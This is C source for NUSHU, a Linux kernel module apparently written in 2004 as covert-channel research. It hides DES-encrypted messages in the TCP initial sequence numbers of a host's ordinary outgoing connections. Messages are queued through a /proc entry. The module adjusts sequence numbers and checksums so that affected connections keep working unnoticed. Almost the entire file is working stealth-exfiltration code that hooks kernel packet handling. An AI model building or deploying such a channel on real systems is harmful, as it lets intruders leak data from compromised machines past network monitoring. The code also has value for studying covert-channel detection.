/*
 * Passive Covert Channel using TCPISN field for sending messages.
 * This channel is passive, meaning it does not generate any packets
 * and only changes the packets which are generated by other processes.
 *
 * written by joanna at invisiblethings.org, 2004.
 *
 * credits to kossak and lifeline for the original phrack article
 * of how to use ptype handlers for backdoors implementation
 *
 */

#define MODULE
#define __KERNEL__

#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/kernel.h>
#include <linux/module.h>
#include <net/tcp.h>
#include <net/ip.h>
#include <linux/proc_fs.h>

//#define DEBUG 
#include "nushu.h"



char *dev;
MODULE_PARM(dev, "s"); 
int cipher = 1;	// 0 - no cipher, 1 - des
MODULE_PARM(cipher, "i");
char *key;
MODULE_PARM(key, "s"); 
char des_key[8+1] = "AAAAAAAA";

char *exclude_ip;
MODULE_PARM(exclude_ip, "s");
__u32 excludedip = 0; // 255 means *

char *snd_message = NULL; 
long snd_msg_len = 0;
int snd_ptr = 0;

struct {
  int acked;
  int tx_no;
  int isn;		// ISN which was sent over network
} packet_stat [MAX_PKTS_PER_BLOCK];
spinlock_t packet_stat_lock = SPIN_LOCK_UNLOCKED;
	
int pktseq_in_block = 0;
int newblock_seq = 1;
int isn_new_block_just_sent = 0;
int isn_new_block_acked = 0;
int first_pkt_sent = 0;
  
struct net_device *d;
struct proc_dir_entry *proc_de; 
struct packet_type cc_proto;

inline int bytes_to_send () {
  return snd_msg_len - snd_ptr;
}

inline int bytes_to_retransmit() {
  int i, r = 0;
  for (i = 0; i < MAX_PKTS_PER_BLOCK; i++) 
    if (packet_stat[i].acked == 0 && packet_stat[i].tx_no) r++;
  return r;
}

inline int block_complete() {
  return (pktseq_in_block < MAX_PKTS_PER_BLOCK) ? 0 : 1;
}

struct conn_info {
  __u32 laddr, faddr;
  __u16 lport, fport;
  __u32 offset;	// new_isn - orig_isn
  struct list_head list;
};

struct list_head conn_info_head;

void conn_info_add (struct conn_info *ci) {
  list_add (&ci->list, &conn_info_head);

}

void conn_info_del (struct conn_info *ci) {
  list_del (&ci->list);
}

struct conn_info* conn_info_check (__u32 laddr, __u16 lport, __u32 faddr, __u16 fport) {
  struct list_head *p;
  struct conn_info *ci;
  list_for_each(p, &conn_info_head) {
    ci = list_entry (p, struct conn_info, list);
    if (ci->laddr == laddr && ci->faddr == faddr &&
	ci->lport == lport && ci->fport == fport) return ci;
  }
  return NULL;
}

void adjust_chksum (struct tcphdr *tcphdr, __u32 old_seq, __u32 new_seq) {
  __u32 diffs[2];
  diffs[0] = old_seq ^ 0xffffffff;
  diffs[1] = new_seq;
  tcphdr->check = csum_fold (csum_partial (
	(char*)diffs, sizeof (diffs), tcphdr->check ^ 0xffff));
}

int cc_read_proc_info (char *buf, char **start, off_t offset, int count,
    int *eof, void *data) {

  int i = 0, len = 0;
  *start = NULL;
  len += sprintf (buf + len, "excluded_ip : %#x\n", excludedip);
  len += sprintf (buf + len, "snd_buff: %d bytes to send\n", bytes_to_send());
  len += sprintf (buf + len, "conn_info list:\n"); 
  struct list_head *p;
  struct conn_info *ci;
  list_for_each(p, &conn_info_head) {
    ci = list_entry (p, struct conn_info, list);
    len += sprintf (buf + len, "%d. %#x:%d --> %#x:%d (offs: %#x)\n",
	i++, ci->laddr, ntohs(ci->lport), ci->faddr, ntohs(ci->fport), ci->offset);
    if (len + 100 > PAGE_SIZE) {
      len += sprintf (buf + len, "...\n");
      goto out;
    }
  }

  len += sprintf (buf + len, "\npacket_stat table:\n");
  len += sprintf (buf + len, "no   ack?  tx_no  isn\n");
  for (i = 0; i < MAX_PKTS_PER_BLOCK; i++) 
    len += sprintf (buf + len, "%3d:   %d     %d     %#8x\n", 
	i, packet_stat[i].acked, packet_stat[i].tx_no, packet_stat[i].isn);

    
out:
  *eof = 1;
  return len;

}


int cc_write_proc_message (struct file *file, const char *buf, 
    unsigned long count, void *data) {

  char *new_snd_message = kmalloc (count + 1, GFP_KERNEL);
  if (!new_snd_message) {
    printk ("NUSHU: cannot allocate memory for snd_message buffer!\n");
    return -ENOMEM;
  }
  memcpy (new_snd_message, snd_message, snd_msg_len);
  memcpy (new_snd_message + snd_msg_len, buf, count);
  snd_msg_len += count;
  kfree (snd_message);
  snd_message = new_snd_message;
  snd_message[snd_msg_len] = 0;
}

int cc_read_proc_message (char *buf, char **start, off_t offset, int count,
    int *eof, void *data) {

  int i = 0, len = 0;
  *start = NULL;
  if (!snd_message) goto out;
  snd_message[snd_msg_len] = 0;
  len += sprintf (buf + len, "%s", &snd_message[snd_ptr]); 
out:
  *eof = 1;
  return len;

}

static __inline__ int tcp_hashfn(__u32 laddr, __u16 lport,
				 __u32 faddr, __u16 fport)
{
  int h = ((laddr ^ lport) ^ (faddr ^ fport));
  h ^= h>>16;
  h ^= h>>8;
  return h & (tcp_ehash_size - 1);
}


// check if the given connection is still alive
int tcp_conn_alive (__u32 laddr, __u16 lport, __u32 faddr, __u16 fport)
{
  struct tcp_ehash_bucket *head;
  struct sock *sk;
  int hash;

  hash = tcp_hashfn(laddr, htons(lport), faddr, fport);
  head = &tcp_ehash[hash];
  read_lock(&head->lock);
  for (sk = head->chain; sk; sk = sk->next)  {
    if (sk->daddr == faddr && sk->dport == fport &&
	sk->rcv_saddr == laddr && sk->num == ntohs(lport)) {

      read_unlock(&head->lock);
      return 1;
    }
  }
  
  // check for a TIME_WAIT
  for(sk = (head + tcp_ehash_size)->chain; sk; sk = sk->next) {
    if (sk->daddr == faddr && sk->dport == fport &&
	sk->rcv_saddr == laddr && sk->num == lport) {

      read_unlock(&head->lock);
      return 1;
    }
  }

  read_unlock(&head->lock);
  return 0;
}

void conn_sweeper() {
  struct list_head *p;
  struct conn_info *ci;

  for (p = conn_info_head.next; p != &conn_info_head; ) {
    ci = list_entry (p, struct conn_info, list);
    p = p->next;
    if (!tcp_conn_alive (ci->laddr, ci->lport, ci->faddr, ci->fport)) {
      dbgprintk ("conn_sweeper(): removing conn: %#x:%d->%#x:%d\n",
	  ci->laddr, ntohs(ci->lport), ci->faddr, ntohs(ci->fport));
      list_del (&ci->list);
      kfree (ci);
    }  
  }
}

__u32 isn_for_syn_pkt (struct tcphdr* tcphdr) {
  __u32 isn = 0; 

  if (!first_pkt_sent) {
	isn = ISN_NEW_BLOCK (newblock_seq);
	newblock_seq ++;
	first_pkt_sent = 1;
	goto out;
  }

  if (isn_new_block_just_sent) {
     if (!isn_new_block_acked) {
       isn = ISN_NEW_BLOCK(newblock_seq); // keep sending until it's not acked
       goto out;
     }
     if (isn_new_block_acked) {
      isn_new_block_just_sent = 0;
      isn_new_block_acked = 0;
     }
  }
  

  if (!bytes_to_send() && !bytes_to_retransmit()) {
    isn = ISN_EMPTY;
    goto out;
  }
	
  spin_lock (&packet_stat);

  if ((!bytes_to_send() || block_complete()) && bytes_to_retransmit()) {
    // retransimt the first not acked yet
    int i, min_pkt_no = -1;

    unsigned min_tx_no = (unsigned)-1;
    for (i = 0; i < MAX_PKTS_PER_BLOCK; i++) 
      if (!packet_stat[i].acked && packet_stat[i].tx_no < min_tx_no) {
	min_tx_no = packet_stat[i].tx_no;
	min_pkt_no = i;
      }


    if (min_pkt_no == -1) {
      printk ("NUSHU: BUG in protocol, min_pkt_no == -1!\n");
      isn = ISN_EMPTY;
    }

    isn = packet_stat[min_pkt_no].isn;

    packet_stat[min_pkt_no].tx_no++;
    
    goto out;
	
  }

  // bytes_to_send > 0 

  if (block_complete() && !bytes_to_retransmit()) {
	
    int i;
    for (i = 0; i < MAX_PKTS_PER_BLOCK; i++) {
      packet_stat[i].acked = 0;
      packet_stat[i].tx_no = 0;
      packet_stat[i].isn = 0;
    }
    
    newblock_seq ++;
    isn = ISN_NEW_BLOCK (newblock_seq); 
    pktseq_in_block = 0;
    isn_new_block_just_sent = 1;
    goto out;

  }


  if (bytes_to_send()) {
    int bnum = 3;
    if (bytes_to_send() < 3) bnum = bytes_to_send();

    char b0 = snd_message[snd_ptr++];
    char b1 = (bnum > 1) ? snd_message[snd_ptr++] : 0x11;
    char b2 = (bnum > 2) ? snd_message[snd_ptr++] : 0x22;
    

    isn = ISN_DATA(pktseq_in_block, bnum, b0, b1, b2);

    packet_stat[pktseq_in_block].tx_no = 1;
    packet_stat[pktseq_in_block].isn = isn;

    
    pktseq_in_block ++;

    goto out;
  }

out:
    spin_unlock (&packet_stat);
    dbgprintk ("isn_for_syn_pkt(): %x\n", isn);
    return isn;
}

int is_excluded (__u32 addr) {
    int i;
    for (i = 3; i >= 0; i--) {
	__u8 ab = (addr>>(i*8))&0xff;
	__u8 eb = (excludedip>>(i*8))&0xff;
	if (ab != eb && eb != 0xff) return 0;
    }	
    return 1;
}


int cc_snd_func(struct sk_buff *skb, 
    struct net_device *dv,
    struct packet_type *pt) {

  if (ntohs(skb->protocol) != ETH_P_IP) goto out;
  if (skb->nh.iph->protocol != IPPROTO_TCP) goto out;

  __u32 orig_isn, new_isn, isn_offset;
  struct conn_info* conn_info = NULL;
  __u32 saddr = skb->nh.iph->saddr;
  __u32 daddr = skb->nh.iph->daddr;

  
  struct iphdr *iphdr = skb->nh.iph; 
  if (ntohs(iphdr->tot_len) < iphdr->ihl*4 + 3 * 4) goto out; // very fragmeneted packet

  struct tcphdr * tcphdr = (struct tcphdr*)(skb->nh.raw + iphdr->ihl*4);

  if (skb->pkt_type == PACKET_OUTGOING && is_excluded(iphdr->daddr)) goto out;

  __u16 sport = tcphdr->source;
  __u16 dport = tcphdr->dest;
  __u16 syn   = tcphdr->syn;
  __u16 fin   = tcphdr->fin;
  __u16 ack   = tcphdr->ack;
  __u16 rst   = tcphdr->rst;

  // initial outgoing packet
  if (syn && !ack && skb->pkt_type == PACKET_OUTGOING) {
    conn_sweeper();
    orig_isn = tcphdr->seq;
    
    new_isn = isn_for_syn_pkt (tcphdr);
 
    new_isn = nushu_encrypt (new_isn, iphdr, tcphdr);

    isn_offset = ntohl(new_isn) - ntohl(orig_isn);
    adjust_chksum (tcphdr, orig_isn, new_isn);

    
    conn_info = kmalloc (sizeof(struct conn_info), GFP_KERNEL);
    if (!conn_info) goto out; 
    conn_info->laddr = saddr;
    conn_info->lport = sport;
    conn_info->faddr = daddr;
    conn_info->fport = dport;
    conn_info->offset = isn_offset;
  
    conn_info_add (conn_info);
    tcphdr->seq = new_isn;	// <--- insert secret message

  }

  // ordinary outgoing packets
  if (!syn && skb->pkt_type == PACKET_OUTGOING) {
    conn_info = conn_info_check (saddr, sport, daddr, dport);
    if (!conn_info) goto out;

    // adjust SEQ number
    __u32 old_seq = tcphdr->seq;
    tcphdr->seq = htonl (ntohl(old_seq) + conn_info->offset);
    adjust_chksum (tcphdr, old_seq, tcphdr->seq);

  }

  // incoming packets
  if (skb->pkt_type == PACKET_HOST) {
    conn_info = conn_info_check (daddr, dport, saddr, sport); // reverse source and dest
    if (!conn_info) goto out;

    dbgprintk ("got packet %c%c%c, ack = %#x\n", 
	(syn) ? 'S' : ' ',
	(ack) ? 'A' : ' ',
	(rst) ? 'R' : ' ',
	tcphdr->ack_seq);

    if (syn && ack || rst) {
      // acknowledge sent packet 

      
      __u32 isn_acked = nushu_decrypt (htonl(ntohl(tcphdr->ack_seq)-1), iphdr, tcphdr);
      dbgprintk ("isn_acked = %#x\n", isn_acked);
      if (is_ISN_NEW_BLOCK(isn_acked, tcphdr)) { 
	isn_new_block_acked = 1;
	dbgprintk ("ack for ISN_NEW_BLOCK\n");
      }

      if (isn_acked != ISN_EMPTY && !is_ISN_NEW_BLOCK(isn_acked, tcphdr)) { 

	spin_lock (&packet_stat_lock);
	int i;
	for (i = 0; i < MAX_PKTS_PER_BLOCK; i++) 
	  if (packet_stat[i].tx_no && 
		packet_stat[i].isn ==  isn_acked) { 
	    packet_stat[i].acked = 1;
	    break;
	  }

	spin_unlock (&packet_stat_lock);
      }

    }

    // adjust SEQ number
    __u32 old_seq = tcphdr->ack_seq;
    tcphdr->ack_seq = htonl (ntohl(old_seq) - conn_info->offset);
    adjust_chksum (tcphdr, old_seq, tcphdr->ack_seq);

  }

out:
  kfree_skb(skb);
  return 0;

}


int usage () {
  return -EINVAL;
}

int init_module() {
  if (dev) {
    d = dev_get_by_name(dev);
    if (!d) printk("Did not find device %s!\n", dev);
  } 

  if (cipher && !key) {
	printk ("cipher key not specified!\n");
	return usage();
  }
  if (cipher && key) strncpy (des_key, key, 8);
  nushu_crypt_init (cipher, des_key);


  if (exclude_ip) 
	excludedip = in_aton (exclude_ip);

  INIT_LIST_HEAD(&conn_info_head);

  cc_proto.type = htons(ETH_P_ALL); 
  cc_proto.func = cc_snd_func;
  cc_proto.dev = d;
  cc_proto.data = (void*)0xbabe;
  dev_add_pack(&cc_proto);

  struct proc_dir_entry *proc_de = proc_mkdir ("nushu", NULL);
  if (!proc_de) {
    printk ("Error creating proc entry!\n");
    return -1;
  }

  create_proc_read_entry ("info",
      0, proc_de, cc_read_proc_info, NULL);

  struct proc_dir_entry * wpde = create_proc_entry ("message_to_send", 0, proc_de); 
  if (!wpde) {
    printk ("Error creating proc entry!\n");
    remove_proc_entry ("info", proc_de);
    remove_proc_entry ("nushu", NULL);
    return -1;
  }

  wpde->write_proc = cc_write_proc_message;
  wpde->read_proc = cc_read_proc_message;
  
  return(0);
}

void cleanup_module() {
  dev_remove_pack(&cc_proto);
  remove_proc_entry ("info", proc_de);
  remove_proc_entry ("message_to_send", proc_de);
  remove_proc_entry ("nushu", NULL);
  kfree (snd_message);
  
  dbgprintk("NUSHU unloaded\n");

}

MODULE_LICENSE("GPL");


